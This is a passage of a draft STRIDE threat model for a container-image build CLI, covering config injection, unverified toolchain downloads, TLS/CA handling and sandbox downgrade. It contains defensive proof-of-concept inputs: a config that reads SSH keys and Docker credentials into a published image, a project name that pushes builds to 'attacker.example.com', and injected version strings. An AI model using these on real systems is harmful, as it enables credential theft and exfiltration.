# Nimbopacks threat model (STRIDE)

| | |
|---|---|
| **Revision** | 1 — first draft |
| **Date** | 2026-10-23 |
| **Author** | Security Engineer |
| **Reviewers** | Principal Architect (architecture invariants), CTO (risk acceptance) |
| **Code reviewed** | `main` @ `3f962f6` |
| **Status** | Draft, pending Principal Architect review |

This is a retrospective threat model: the code exists, so the surfaces below were read
rather than designed. Every finding was derived by reading the named file at the named
line on `3f962f6`. Where a claim could not be demonstrated in this environment, it says
so and says why it is still believed to be real.

---

## 1. Scope

### 1.1 In scope

| # | Surface | Primary code |
|---|---|---|
| 1 | Untrusted `nimpack.yaml` — melange pipeline injection, `${{ }}` expansion | `internal/config/`, `internal/types/`, `internal/pack/`, `pkg/packs/*` |
| 2 | Toolchain download integrity | `internal/toolchain/toolchain.go` |
| 3 | TLS and custom CA handling | `internal/utils/tlsutil.go` |
| 4 | Container runner privileges (the melange runner) | `pkg/backend/wolfi/wolfi.go`, `.github/workflows/samples.yml` |
| 5 | GitHub Actions supply chain | `.github/workflows/*`, `.github/dependabot.yaml` |

### 1.2 Explicitly deferred

- **`internal/remote/`** — remote git sources, URL parsing, `git` argument injection,
  `//subdir` path traversal. **This package does not exist in this checkout and there is
  no `feature-remote-repos` branch.** Modelling it now would be fiction. It must be
  modelled before the first line of that package merges; the charter already names it as
  a sign-off surface.
- **Registry push authentication.** `AssembleImage` shells out to `docker push`
  (`wolfi.go:229`) and inherits ambient Docker credentials. Deferred until a first-class
  push path exists.
- **The Paperclip agent control plane.** Out of this repository's trust boundary.

### 1.3 Not modelled because the surface does not exist

Nimbopacks is a local CLI. There is no network listener, no user accounts, no session
management, no database, and no PII. The web-application lens set (authn/authz, session
fixation, CSRF, SQL injection, SSRF-from-user-request) is therefore not applied. **If a
future change adds a network service, a registry proxy, or an auth surface, this section
is void and the broader lens set must be applied before that change merges.**

---

## 2. Trust boundaries

```
 ┌─ TB-1 ──────────────────────────────────────────────────────────────────┐
 │ UNTRUSTED INPUT                                                         │
 │   nimpack.yaml · project source tree · referenced CA cert files         │
 │   community templates · samples/**  (all attacker-controllable via PR)  │
 └────────────────────────────┬────────────────────────────────────────────┘
                              │  parsed by internal/config (no validation)
 ┌────────────────────────────▼────────────────────────────────────────────┐
 │ NIMBOPACKS PROCESS            runs as the invoking user, full user privs │
 │   pipeline → pack.Plan → BuildPlan → backend.wolfi                      │
 └──────┬──────────────────────┬────────────────────────┬──────────────────┘
        │ TB-2                 │ TB-3                   │ TB-4
        │ fetch + exec         │ exec melange/apko      │ write image layers
        ▼                      ▼                        ▼
 ┌──────────────┐   ┌──────────────────────┐   ┌────────────────────────┐
 │ api.github   │   │ BUILD SANDBOX        │   │ PUBLISHED OCI IMAGE    │
 │ .com +       │   │ bubblewrap (userns)  │   │ + SBOM + cosign sig    │
 │ release CDN  │   │  OR docker (root!)   │   │ + Rekor entry          │
 │ (TB-2)       │   │ runs build.command   │   │ (TB-4)                 │
 └──────────────┘   └──────────────────────┘   └────────────────────────┘

 ┌─ TB-5 ──────────────────────────────────────────────────────────────────┐
 │ GITHUB ACTIONS: fork PR (read-only token) │ tag push (packages:write,    │
 │                                           │ id-token:write → signs)      │
 └─────────────────────────────────────────────────────────────────────────┘
```

**TB-1 is the boundary that matters most, and today it is not mediated at all.**
`internal/config.Validate` exists (`config.go:18`) and is **never called** — `grep -rn
"config.Validate"` returns only its definition and its unit test. `internal/pipeline`
calls `config.Load` (`pipeline.go:29`) and goes straight to `pack.Plan`. Complete
Mediation is violated by construction: there is no checkpoint between untrusted YAML and
the build plan.

---

## 3. Scoring

Severity and exploitability are scored **separately**, per the review bar. A critical
finding that needs a nation-state to trigger is not the same risk as a medium finding a
drive-by PR can hit.

**Severity (S)** — impact assuming the attacker succeeds:

| | Meaning |
|---|---|
| **S5 Critical** | Arbitrary code execution on a maintainer/CI host, or tampering that reaches a published, signed release artifact. |
| **S4 High** | Secret disclosure, or arbitrary code execution confined to the build sandbox. |
| **S3 Medium** | Integrity or confidentiality loss confined to one build, or a silently weakened security control. |
| **S2 Low** | Denial of service, or an observable-but-contained misbehaviour. |
| **S1 Info** | Hygiene; no direct attacker benefit. |

**Exploitability (E)** — how hard it is to reach:

| | Meaning |
|---|---|
| **E5 Trivial** | Any contributor opening a PR, or anyone the user already runs code from. No special position. |
| **E4 Easy** | Requires a plausible position: a corporate MITM proxy, a shared CI runner, a published community template. |
| **E3 Moderate** | Requires a specific precondition the attacker cannot set alone (a flag enabled, a particular platform). |
| **E2 Hard** | Requires compromising a well-defended third party (Wolfi, Chainguard, GitHub). |
| **E1 Theoretical** | No practical path known today. |

---

## 4. Surface 1 — Untrusted `nimpack.yaml`

**STRIDE: Tampering, Elevation of privilege, Information disclosure, Denial of service.**
(No Spoofing or Repudiation — the config has no identity and no audit claim.)

### 4.0 The governing design fact

`nimpack.yaml` is **executable**. `build.command` is copied verbatim into a melange
pipeline `runs:` block by every pack — `golangpack.go:116`, `nodepack.go:75`,
`pythonpack.go:110`, `javapack.go:125`, `dotnetpack.go:243`, `webserverpack.go:173`. That
is the feature, not a bug; a build tool has to run the build. The security consequence
must be written down and enforced rather than left implicit:

> **Building a `nimpack.yaml` is equivalent to running it as a shell script.** Never
> build a config you would not `bash` unreviewed.

Everything below is about the parts of the config that are *not* obviously code and that
a reader would therefore assume are inert data.

---

### CFG-1 — Arbitrary file read via `tls.ca_cert_paths` exfiltrated into the published image

| | |
|---|---|
| **Class** | Path traversal (CWE-22) in CA-bundle resolution chained to exposure of sensitive information to an unauthorised actor (CWE-200) via an OCI layer |
| **STRIDE** | Information disclosure |
| **Severity** | **S4 High** |
| **Exploitability** | **E4 Easy** |
| **Owner** | Security Engineer |
| **Lenses** | Input handling (allowlist beats denylist), Least Privilege, Secure Defaults |

**Attack path — demonstrated by code reading, end to end:**

1. `tlsutil.resolvePath` (`tlsutil.go:128`) resolves a relative path with
   `filepath.Join(srcDir, path)` and returns an absolute path unchanged. There is no
   `..` rejection and no containment check against `srcDir`.
2. `LoadCACerts` (`tlsutil.go:23`) `os.ReadFile`s every entry and concatenates the raw
   bytes. **It never parses the result as PEM.** Only `NewTLSConfig` calls
   `AppendCertsFromPEM` — and `NewTLSConfig` has zero callers (§5.1).
3. `wolfi.BuildPackage` (`wolfi.go:95`) calls `LoadCACerts` **directly**, so the
   unvalidated bytes skip the only PEM check in the codebase.
4. `TLSConfig.ShouldInjectIntoImage()` (`types.go:61`) **defaults to true**.
5. `ImageCACertInstallStep` (`tlsutil.go:113`) emits a pipeline step that copies the
   bundle to `${{targets.destdir}}/etc/ssl/certs/nimbopacks-custom-ca.pem` and
   `/usr/local/share/ca-certificates/nimbopacks-custom-ca.crt`.
6. Those paths are under `${{targets.destdir}}`, so melange packages them. The file is in
   the image, in the SBOM's file inventory, and in any registry it is pushed to.

**Proof-of-concept config:**

```yaml
schema_version: "1"
project: { name: innocuous, version: "1.0.0" }
build:   { pack: golang }
tls:
  ca_cert_paths:
    - "../../../../home/runner/.ssh/id_rsa"     # traversal out of srcDir
    - "/home/runner/.docker/config.json"        # absolute, no containment check
  # inject_into_image omitted — defaults to true
```

Result: the built image contains the host's SSH private key and registry credentials at
`/etc/ssl/certs/nimbopacks-custom-ca.pem`. Nothing in the output says so; the build log
prints only `→ Custom CA certificates configured` (`pipeline.go:87`).

**Blast radius.** Any secret readable by the build user on a machine that builds an
attacker-supplied config, published to wherever the image goes. The realistic victims are
(a) a CI job that builds a fork PR's `nimpack.yaml`, and (b) a user who runs a community
template or sample. The charter's own goal of "templates built for community
contribution" makes (b) a first-class path, not a hypothetical.

**Not demonstrated:** the image could not be built — Docker is unavailable in this
environment, so melange/apko cannot run. The file-read and the pipeline-step emission are
both plain Go that can be read directly; only the final "the bytes are in the layer" step
rests on melange's documented `${{targets.destdir}}` packaging rule, which `CLAUDE.md`
states as an invariant. I rate the chain confirmed-by-reading and will attach a built-image
proof once Docker exists.

**Phase 1 mitigation.**

1. In `resolvePath`, resolve with `filepath.Abs` + `filepath.EvalSymlinks` and reject any
   result not contained in `srcDir`, unless the path came from the `--ca-cert` CLI flag
   (an explicit operator action) rather than from `nimpack.yaml`. Config-supplied paths
   get no escape hatch.
2. In `LoadCACerts`, parse every file with `pem.Decode` in a loop and **reject the build**
   unless every block is `CERTIFICATE` and `x509.ParseCertificate` succeeds. A CA bundle
   that is not a CA bundle is a bug in every case; failing closed costs nothing.
3. Flip the default: `inject_into_image` defaults to **false**. Putting a private CA in a
   shipped image is the dangerous path and must be the opt-in one.
4. Log every injected certificate's subject and SHA-256 fingerprint at build time, so the
   operator can see what they shipped.

**Residual risk after Phase 1:** a user can still deliberately inject a real certificate
they control. That is the feature. Secrets that happen to be valid X.509 certificates
(e.g. a client cert) would still pass the parser — accepted, because the subject/fingerprint
log makes it visible.

---

### CFG-2 — `project.name` is unvalidated and becomes a registry reference

| | |
|---|---|
| **Class** | Unvalidated config value used as an OCI image reference (CWE-20 → CWE-200) |
| **STRIDE** | Information disclosure, Spoofing |
| **Severity** | **S4 High** |
| **Exploitability** | **E3 Moderate** (requires `--push`) |
| **Owner** | Principal Architect (schema), Security Engineer (validation) |
| **Lenses** | Input handling, Complete Mediation |

**Attack path.** `wolfi.AssembleImage` (`wolfi.go:166`) builds the default tag as
`plan.Melange.Package.Name + ":latest"`, and `pack.ApplyConfig` (`pack.go:160`) sets
`Package.Name = cfg.Project.Name` with no validation. When `--push` is set, that string is
passed to `docker push` (`wolfi.go:230`).

```yaml
project:
  name: "attacker.example.com/exfil/app"
```

→ `docker push attacker.example.com/exfil/app:latest`. The image — containing the
victim's source, build artefacts, and anything CFG-1 dragged in — goes to a registry the
attacker controls. `docker push` receives the value as an `argv` element, so there is no
*shell* injection, but the registry host itself is the injected value.

The same unvalidated name is also prepended to the apko package list
(`pack.go:126`) and becomes the APK package name, where a name containing whitespace or an
apk version constraint (`foo~1.0`, `foo>9999`) changes which packages apko resolves.

**Blast radius.** Exfiltration of a complete build to an attacker-chosen registry, plus
image-identity spoofing. Bounded by `--push` being opt-in.

**Phase 1 mitigation.** Validate `project.name` against `^[a-z0-9][a-z0-9._-]{0,62}$` at
load time and reject on mismatch. That is the APK package-name charset; it cannot contain
`/`, `:`, or whitespace, which kills both the registry-reference and the apk-constraint
variants at once. Enforce it in a re-activated `config.Validate` (see CFG-4), not in each
pack.

**Residual risk:** none for this class once the charset is enforced; `--push` with an
explicit `--tag` remains the operator's responsibility.

---

### CFG-3 — Second-order `${{ }}` expansion injection via `project.version`

| | |
|---|---|
| **Class** | Template-expansion injection into a melange pipeline, leading to command injection inside the build sandbox |
| **STRIDE** | Elevation of privilege (within the sandbox), Tampering |
| **Severity** | **S3 Medium** (S4 if the runner is docker — see RUN-1) |
| **Exploitability** | **E3 Moderate** |
| **Owner** | Principal Architect (schema), Security Engineer |
| **Lenses** | Input handling (reject ambiguous input), parser differentials |

**Attack path.** `project.version` is unvalidated (`pack.go:161` assigns it straight to
`Package.Version`) and lands in melange's `package.version`. melange expands
`${{package.version}}` inside pipeline `runs:` blocks and `uses:`/`with:` values. The
repository's own `melange.yaml` does exactly this:

```yaml
ldflags: -s -w -X main.version=${{package.version}}
```

A `version` of `0.1.0 -X main.x=y` injects an extra linker flag. A version containing
`` ` `` or `$( )` reaches a `runs:` shell in any template that embeds the version in a
script. More subtly, a version containing a literal `${{` can introduce a *melange*
expansion that was never in the template — a genuine parser differential between "what
nimbopacks wrote" and "what melange executes".

**Honest limitation.** I could not demonstrate a working shell escape, for two reasons,
and I am stating them rather than overclaiming:

1. No template in `pkg/templates/templates/` currently embeds `${{package.version}}`
   inside a `runs:` block — `grep` confirms zero matches. The hazardous sink exists only
   in the repository's own root `melange.yaml`, which is maintainer-controlled.
2. melange cannot be executed here (no Docker), so the exact expansion/quoting semantics
   could not be exercised.

**I still believe this is real** because (a) the sink is one community template away —
the charter's explicit goal is "contributors add templates without writing Go", and a
template author embedding `${{package.version}}` in a `runs:` block is the obvious thing
to do; (b) nothing in the codebase prevents it, and nothing warns a template author; and
(c) the root `melange.yaml` already proves the pattern is idiomatic here. This is a
pre-positioned vulnerability waiting for its sink, and the cost of validating a version
string is one regex.

**Phase 1 mitigation.** Validate `project.version` against
`^[0-9]+(\.[0-9]+){0,3}([-+][0-9A-Za-z.-]+)?$` at load time. Reject `${{`, backticks,
`$(`, quotes, newlines, and whitespace anywhere in the value. Add a template-author note
to `CLAUDE.md`'s "Adding a template" section. Add a `go test -fuzz` target over
`config.Load` + `Validate` that asserts no accepted value contains `${{`.

**Residual risk:** melange's own expansion of maintainer-written templates is unchanged.
A malicious template is still a malicious template; template review is the control there.

---

### CFG-4 — The config validator is dead code (complete-mediation failure)

| | |
|---|---|
| **Class** | Missing input validation — security check implemented but never invoked (CWE-1288 / CWE-20) |
| **STRIDE** | Tampering, Denial of service |
| **Severity** | **S3 Medium** (it is the enabling condition for CFG-2 and CFG-3) |
| **Exploitability** | **E5 Trivial** |
| **Owner** | Security Engineer |
| **Lenses** | Complete Mediation, Fail Securely |

**Evidence.** `config.Validate` is defined at `internal/config/config.go:18`.
`grep -rn "config.Validate" --include=*.go .` returns the definition and
`config_test.go` only. Neither `internal/pipeline/pipeline.go:29` nor
`internal/update/update.go:44` calls it. Every build in the product runs on a config that
has never been checked for anything, including the three fields `Validate` claims are
required.

**Secondary defects in the loader, all at `config.go:34`:**

- **`schema_version` is never checked.** A file declaring `schema_version: "2"` is parsed
  as v1 and built. When v2 exists, this is a version-confusion parser differential: the
  author's intent and the tool's interpretation diverge silently.
- **Unknown keys are silently discarded.** `yaml.Unmarshal` is used without
  `Decoder.KnownFields(true)`. A typo such as `tls: { insecur: true }` or
  `image: { run_as_: 0 }` is accepted and ignored, so a user who believes they configured
  a control has not. Allowlist-beats-denylist applies to config keys too.
- **No size limit.** `os.ReadFile` on an arbitrary path with no cap, feeding a YAML
  parser. `gopkg.in/yaml.v3` has internal alias-expansion limits, so I am **not** claiming
  a billion-laughs break; I am claiming there is no defence-in-depth bound and no reason
  not to have one.
- **`Load` returns `(nil, nil)` for a missing file.** Both call sites happen to handle it
  (`pipeline.go:33`), but a fail-open sentinel is the wrong default shape for a security-
  relevant loader; a third caller will get it wrong.

**Phase 1 mitigation.** Call `config.Validate(cfg)` from `pipeline.Build` and
`update.Run` immediately after `Load`, and extend it to enforce CFG-2's name charset,
CFG-3's version charset, `schema_version == "1"`, and `tls.ca_cert_paths` containment.
Add `Decoder.KnownFields(true)` and a 1 MiB read cap. Ship a regression test per rule.

**Residual risk:** `build.command` remains arbitrary shell by design (§4.0). Validation
does not change that and must not pretend to.

---

## 5. Surface 2 — Toolchain download integrity

**STRIDE: Tampering, Spoofing, Elevation of privilege, Denial of service.**

This is the highest-value surface in the product. `nimbopacks toolchain install`
downloads three binaries from the internet, writes them mode `0755`, and executes them as
the invoking user on every subsequent build — including on CI runners
(`.github/workflows/samples.yml:80`).

---

### TCH-1 — Downloaded binaries are executed with no integrity verification whatsoever

| | |
|---|---|
| **Class** | Download of code without integrity check (CWE-494) |
| **STRIDE** | Tampering → Elevation of privilege |
| **Severity** | **S5 Critical** |
| **Exploitability** | **E2 Hard** today / **E4 Easy** when chained with TLS-1 |
| **Owner** | Security Engineer |
| **Lenses** | Supply chain (verify every downloaded binary), Defense in Depth, Fail Securely |

**Evidence.** `downloadRelease` (`toolchain.go:358`) fetches an asset, and at
`toolchain.go:447` writes it straight to `~/.nimbopacks/toolchain/bin/<tool>` with mode
`0755`. There is **no** SHA-256 comparison, **no** cosign/Sigstore verification, and
**no** SLSA provenance check anywhere in the file. `grep -i "sha256\|cosign\|sigstore\|
provenance\|verify"` over `internal/toolchain/` returns only the `.sha256` entry in the
skip list.

That skip list is the sharpest part of the finding. At `toolchain.go:391`:

```go
skipSuffixes := []string{".deb", ".rpm", ".apk", ".msi", ".pkg", ".sha256", ".pem", ".sig", ".sbom"}
```

The code **identifies** the checksum, certificate, and signature assets — and discards
them. Chainguard publishes cosign signatures and certificates for melange and apko;
Anchore publishes `grype_<ver>_checksums.txt` plus a cosign bundle for grype. All the
material needed to verify is already sitting in the same API response the code just
parsed. Economy of Mechanism is not the obstacle here; the verification inputs are free.

**Attack paths, in ascending order of plausibility:**

- *Upstream account compromise.* An attacker who can attach or replace a release asset on
  `chainguard-dev/melange`, `chainguard-dev/apko`, or `anchore/grype` achieves arbitrary
  code execution on every machine that subsequently runs `toolchain install` — and, via
  `samples.yml`, inside CI. E2.
- *Transport interception.* See TLS-1 and TLS-2. Any position that lets an attacker
  terminate TLS to `api.github.com` or `objects.githubusercontent.com` — a corporate MITM
  proxy with its CA in the system store, a compromised egress appliance — yields the same
  RCE, with no signature to stop it. E4.
- *Version-pin absence.* `Install(ctx, "")` resolves `releases/latest`
  (`toolchain.go:331`) with no floor, no lockfile, and no record of what was expected.
  A backdoored upstream release is picked up by the next `toolchain install` or
  `toolchain upgrade` within minutes of publication, with no rollback story. The
  `versions.json` written at `toolchain.go:216` records what was installed but is never
  read back to verify anything.

**Blast radius.** Arbitrary code execution as the developer on every developer machine
that installs the toolchain, and as the runner user in CI with `GITHUB_TOKEN` in the
environment (`samples.yml:79`) and the checkout token in `.git/config` (CI-5). From there
it pivots into any image the victim builds — which is the product's entire value
proposition. **This single finding is the difference between Nimbopacks being a
supply-chain security tool and being a supply-chain attack vector.**

**Not demonstrated:** no exploit was built. Doing so would require either compromising a
Chainguard/Anchore release or standing up a MITM, neither of which is in scope or
authorised. The absence of verification is a direct reading of the file and needs no
proof-of-concept; CWE-494 is established by the code's own skip list.

**Phase 1 mitigation.** One centralised verify-then-install helper — fix the class, not
three instances:

```go
// internal/toolchain/verify.go
func fetchVerified(ctx context.Context, spec ToolSpec) (path string, err error)
```

1. **Pin by default.** Ship a committed `toolchain.lock` with `{tool, version, os, arch,
   sha256}` for every supported platform. `toolchain install` with no `--version` installs
   the locked version, not `latest`. `--version`/`upgrade` rewrites the lock and prints a
   diff.
2. **Verify the digest unconditionally.** Stream the download through
   `sha256.New()` and compare against the lock before anything is written to the install
   directory. Mismatch = hard failure, nothing written. No `--skip-verify` flag; if one is
   ever added it must be a build tag, not a runtime flag.
3. **Download to a `0600` temp file in the same directory, `chmod 0755` and
   `os.Rename` only after verification passes.** Today a failed or truncated download
   leaves an executable at the canonical path.
4. **Phase 2 (schedule now, 30 days):** cosign keyless verification against the upstream
   OIDC identity for melange/apko/grype, and SLSA provenance where published. Digest
   pinning is the 90%-good fix available this week; signature verification is the right
   long-term control because it survives a lock-file bump.

**Residual risk after Phase 1:** a digest pin trusts whoever wrote the lock entry. A
malicious upstream release that is pinned *into* the lock by a routine Dependabot-style
bump would still be installed. Signature verification (Phase 2) plus human review of lock
bumps is the answer; until then, lock changes must be a CODEOWNERS-protected path (CI-4).

---

### TCH-2 — Release asset selected by substring match against a denylist

| | |
|---|---|
| **Class** | Ambiguous resource resolution — denylist-based filtering with unanchored substring matching (CWE-625 / CWE-183) |
| **STRIDE** | Tampering, Spoofing |
| **Severity** | **S4 High** (it is the delivery vehicle for TCH-1) |
| **Exploitability** | **E2 Hard** standalone |
| **Owner** | Security Engineer |
| **Lenses** | Input handling (allowlist beats denylist), Economy of Mechanism |

**Evidence.** `toolchain.go:403–416`:

```go
if strings.Contains(strings.ToLower(asset.Name), strings.ToLower(pattern)) {
    downloadURL = asset.BrowserDownloadURL
```

Selection is an **unanchored `Contains`** against patterns like `melange_linux_amd64`,
filtered only by the suffix denylist above. Three concrete failure modes:

1. **Denylist bypass by suffix.** An asset named `grype_0.111.0_linux_amd64.sha256.txt`
   is *not* skipped — its suffix is `.txt`, not `.sha256` — and *does* match the pattern.
   It would be installed as the `grype` binary. Likewise `..._linux_amd64.tar.gz.sbom.json`
   (suffix `.json`) and `..._linux_amd64.att`. This is not hypothetical upstream
   behaviour; it is the generic failure mode of denylisting filename suffixes.
2. **Prefix/suffix smuggling.** `melange_linux_amd64_PATCHED`, `evil-melange_linux_amd64`,
   and `melange_linux_amd64-v2` all match. An attacker who can add (not replace) a single
   asset to a release wins, which is a strictly weaker requirement than replacing the real
   one.
3. **Order dependence.** The loop takes the *first* match in GitHub's asset ordering, so
   which binary is installed depends on an upstream-controlled list order. Non-determinism
   in a security decision is itself the defect.

**Phase 1 mitigation.** Replace the whole block with an **exact-name allowlist** derived
from the lock file: `toolchain.lock` names the exact asset filename per
`(tool, version, os, arch)`, and selection is `asset.Name == spec.AssetName`. No
`Contains`, no suffix denylist, no ordering dependence. Combined with TCH-1's digest check
this makes asset selection unambiguous. Unit-test with a synthetic release payload
containing all three decoy names above.

**Residual risk:** adding a new platform requires a lock entry. That is correct — an
unlocked platform should fail loudly rather than guess.

---

### TCH-3 — Unbounded archive expansion and missing transport limits

| | |
|---|---|
| **Class** | Decompression bomb / uncontrolled resource consumption (CWE-409, CWE-400) |
| **STRIDE** | Denial of service |
| **Severity** | **S2 Low** |
| **Exploitability** | **E2 Hard** (requires the same position as TCH-1) |
| **Owner** | Security Engineer |
| **Lenses** | Fail Securely, Defense in Depth |

`extractFromTarGz` (`toolchain.go:461`) iterates tar entries with no cap on entry count,
so a tar with millions of headers spins the CPU before any match is found. The
`io.LimitReader(tr, maxBinaryBytes)` cap is 500 MiB per extracted file — a gzip bomb can
therefore fill 500 MiB of disk legitimately. `http.DefaultClient` is used for both the API
call (`toolchain.go:340`) and the download (`toolchain.go:430`) with **no `Timeout`**, so a
slowloris server hangs `toolchain install` indefinitely.

**Credit where due — two things are already right here**, and should not be regressed:

- The extractor matches on `filepath.Base(hdr.Name)` and writes to a fixed `destPath`
  (`toolchain.go:478`). **Zip-Slip / tar path traversal is not possible.** This is the
  correct pattern and should be preserved verbatim through any refactor.
- `setGitHubAuth` (`toolchain.go:321`) is applied to the two `api.github.com` requests and
  **not** to the asset download (`toolchain.go:425`). `GITHUB_TOKEN` is therefore not sent
  to the release CDN or to any redirect target. Correct, and worth an explicit comment so
  it is not "helpfully" added later.

**Phase 1 mitigation.** Give the toolchain a dedicated `*http.Client` with
`Timeout: 5 * time.Minute`; cap tar entries at 10 000; reduce `maxBinaryBytes` to a
realistic 250 MiB; add the regression test for the traversal case so the existing good
behaviour is locked in.

**Residual risk:** negligible. DoS against a local CLI is self-inflicted.

---

## 6. Surface 3 — TLS and custom CA handling

**STRIDE: Spoofing, Tampering, Information disclosure.**

### 6.1 The headline fact

**`tlsutil.NewTLSConfig` has zero callers.** `grep -rn "NewTLSConfig" --include=*.go .`
returns the definition and its doc comment. Nothing else. The package doc claims it is
"Used by the toolchain manager, updater, and registry push operations"
(`tlsutil.go:64–66`). It is used by none of them.

Two independent consequences follow, and they point in opposite directions.

---

### TLS-1 — `tls.insecure` is parsed, documented, and unenforced

| | |
|---|---|
| **Class** | Security control present in the configuration surface but not wired to any enforcement point (CWE-1288); improper certificate validation (CWE-295) once it *is* wired |
| **STRIDE** | Spoofing, Tampering |
| **Severity** | **S3 Medium** today → **S5 Critical** the moment it is wired up |
| **Exploitability** | **E5 Trivial** to set; **E4** to abuse once enforced |
| **Owner** | Security Engineer |
| **Lenses** | Secure Defaults, Fail Securely, Open Design |

**Today.** `types.TLSConfig.Insecure` (`types.go:56`) is accepted by the parser and
documented as "disables TLS verification entirely". The only code that reads it is
`NewTLSConfig` (`tlsutil.go:68`), which nothing calls. A user who sets
`tls: { insecure: true }` gets **no behaviour change at all** — their builds still verify
certificates. That is accidentally safe and genuinely dangerous: the config lies to the
operator in the safe direction now, and will lie in the unsafe direction the day someone
wires the function up thinking they are fixing a bug.

**Tomorrow.** When `NewTLSConfig` is connected to the toolchain downloader — the obvious
"fix" for the custom-CA gap in TLS-2 — `InsecureSkipVerify: true` becomes reachable from a
single line of attacker-supplied YAML, and it chains directly with TCH-1: no certificate
validation plus no binary verification equals arbitrary code execution for anyone on the
network path. The `//nolint:gosec` at `tlsutil.go:69` means the linter will not object.

**Phase 1 mitigation.**

1. **Remove `Insecure` from `nimpack.yaml` entirely.** A repo-committed file must not be
   able to disable transport security for whoever clones it. If the debugging capability
   is genuinely needed, move it to `NIMBOPACKS_TLS_INSECURE=1` — an environment variable
   is a deliberate act by the person at the keyboard and does not travel with the repo.
2. When it is set, print a red banner on **every** affected request and refuse to combine
   it with `--push` or with `toolchain install`. Downloading an executable over an
   unverified channel is never a debugging need.
3. Pending removal: have `config.Validate` **hard-fail** on `tls.insecure: true` with
   "this field is not implemented and must not be relied upon". Fail closed on a security
   knob that does nothing.
4. Delete or wire `NewTLSConfig`. Dead security code is worse than absent security code —
   it reads as a control during review.

**Residual risk:** an operator can still set the env var. That is the intended, visible,
non-propagating escape hatch.

---

### TLS-2 — Custom CAs do not reach the toolchain downloader, and the sandbox trust store is replaced rather than extended

| | |
|---|---|
| **Class** | Incomplete propagation of a trust-anchor configuration, creating a usability cliff that pushes users toward disabling verification |
| **STRIDE** | Spoofing (via the workaround users adopt), Denial of service |
| **Severity** | **S3 Medium** |
| **Exploitability** | **E4 Easy** — this is the default experience behind any corporate proxy |
| **Owner** | Security Engineer |
| **Lenses** | Secure Defaults ("the insecure path must not be the easy path"), Economy of Mechanism |

Two halves of the same problem:

**(a) Toolchain downloads ignore `tls.ca_cert_paths`.** `internal/toolchain` uses
`http.DefaultClient` (`toolchain.go:340`, `:379`, `:430`), which knows nothing about
`TLSConfig`. A user behind a TLS-terminating corporate proxy configures
`ca_cert_paths`, watches their melange build succeed, and watches
`nimbopacks toolchain install` fail with an opaque x509 error. The documented remedy —
`tls.insecure` — does nothing (TLS-1), so the user's actual remedies are
`GODEBUG=x509ignoreCN`, hand-installing the CA system-wide, or giving up. One of those is
a security decision made in frustration.

**(b) The build sandbox's trust store is replaced, not extended.**
`MelangeEnvVars` (`tlsutil.go:98`) sets `SSL_CERT_FILE`, `CURL_CA_BUNDLE`,
`REQUESTS_CA_BUNDLE`, `GIT_SSL_CAINFO`, and `NODE_EXTRA_CA_CERTS` to a bundle containing
**only** the user's custom CAs. For OpenSSL, curl, and git, those variables *override* the
default CA file rather than adding to it. So the moment a user adds a corporate CA, every
public TLS endpoint their build touches — `proxy.golang.org`, `registry.npmjs.org`,
`repo.maven.apache.org`, PyPI — stops verifying successfully. (`NODE_EXTRA_CA_CERTS` is
the one that genuinely appends; the inconsistency makes the failure harder to diagnose.)

The predictable user response is to disable verification in their own build command, e.g.
`npm config set strict-ssl false` or `pip --trusted-host`, inside the `build.command` that
then ships into the image.

**This is the exact pattern the charter says to treat as a bug rather than a tradeoff:
the secure path is harder than the insecure one.**

**Phase 1 mitigation.**

1. Build the sandbox bundle as **system roots + custom CAs**, not custom CAs alone: read
   the Wolfi `ca-certificates-bundle` contents inside the build image and concatenate, or
   copy the custom CAs into `/usr/local/share/ca-certificates/` and run `update-ca-certificates`
   in a pipeline step instead of overriding `SSL_CERT_FILE`. The latter is simpler and is
   the distribution-blessed mechanism.
2. Give `internal/toolchain` a `*http.Client` built from `NewTLSConfig(srcDir, cfg.TLS)`
   so custom CAs apply to downloads — **after** TLS-1 removes `Insecure` from the config,
   not before. Ordering matters: wiring this up first is what turns TLS-1 from medium into
   critical.

**Residual risk:** trusting an additional CA is inherently a trust expansion. Logging the
injected subjects/fingerprints (CFG-1 mitigation 4) makes it auditable.

---

### TLS-3 — CA bundle written world-readable into the user's working tree

| | |
|---|---|
| **Class** | Insecure temporary file creation in a shared directory (CWE-377) with incorrect permissions (CWE-732) |
| **STRIDE** | Information disclosure |
| **Severity** | **S3 Medium** |
| **Exploitability** | **E3 Moderate** |
| **Owner** | Security Engineer |
| **Lenses** | Least Privilege, Secrets management (never in source) |

**Evidence.** `wolfi.go:100–105`:

```go
const bundleName = ".nimbopacks-ca-bundle.pem"
hostBundle := filepath.Join(opts.SourceDir, bundleName)
if err := os.WriteFile(hostBundle, pemData, 0o644); err != nil { ... }
defer os.Remove(hostBundle)
```

Three problems, in order of severity:

1. **It is written into the user's git working tree**, not a temp dir. `.gitignore`
   contains no entry for `.nimbopacks-ca-bundle.pem` — verified. A concurrent
   `git add -A` during a build, or a build killed by `SIGINT`/`SIGKILL`/`os.Exit` (where
   `defer` does not run), leaves the file in the tree where the next commit picks it up.
   Chained with CFG-1, the "CA bundle" may be an SSH key, and the destination may be a
   public repository.
2. **Mode `0644`.** Every local user can read it for the duration of the build. The same
   file's sibling, `writeEnvFile` at `wolfi.go:336`, correctly uses `0600`. The
   inconsistency within one function is the tell that `0644` was not a decision.
3. The cleanup is best-effort and unordered with respect to signal handling.

**Phase 1 mitigation.** Write the bundle to the build work directory from
`cache.NewBuildWorkDir()` with mode `0600`, not into `SourceDir`; melange already receives
`--source-dir` separately, so the bundle can be mounted or referenced from the work dir.
If it must land in the source tree for the sandbox to see it, use `0600` **and** add
`.nimbopacks-ca-bundle.pem` to `.gitignore` **and** register a signal handler that removes
it. Regression test: assert the file mode is `0600` and that the path is not under
`SourceDir`.

**Residual risk:** a hard `SIGKILL` can still orphan the file. The `.gitignore` entry is
the backstop for the commit path.

---

## 7. Surface 4 — Container runner privileges

**STRIDE: Elevation of privilege, Tampering.**

### RUN-1 — Silent downgrade from the bubblewrap sandbox to the Docker runner

| | |
|---|---|
| **Class** | Silent security-control downgrade — automatic substitution of an unprivileged sandbox with a root-equivalent one, with no operator consent (CWE-636: not failing securely) |
| **STRIDE** | Elevation of privilege |
| **Severity** | **S4 High** |
| **Exploitability** | **E4 Easy** — bubblewrap is absent by default on WSL2, macOS, and most rootless container environments |
| **Owner** | Principal Architect (backend behaviour), Security Engineer (sign-off) |
| **Lenses** | Fail Securely, Least Privilege, Secure Defaults |

**Evidence.** `detectMelangeRunner` (`wolfi.go:294`):

```go
if _, err := exec.LookPath("bwrap"); err == nil { return "" }   // bubblewrap
if _, err := exec.LookPath("docker"); err == nil { return "docker" }
